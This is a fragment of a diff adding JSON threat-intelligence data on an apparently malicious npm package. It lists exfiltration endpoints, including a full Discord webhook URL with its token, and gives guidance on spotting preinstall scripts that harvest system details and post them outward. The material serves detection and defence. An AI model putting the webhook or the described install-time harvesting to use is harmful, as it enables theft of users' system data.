+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
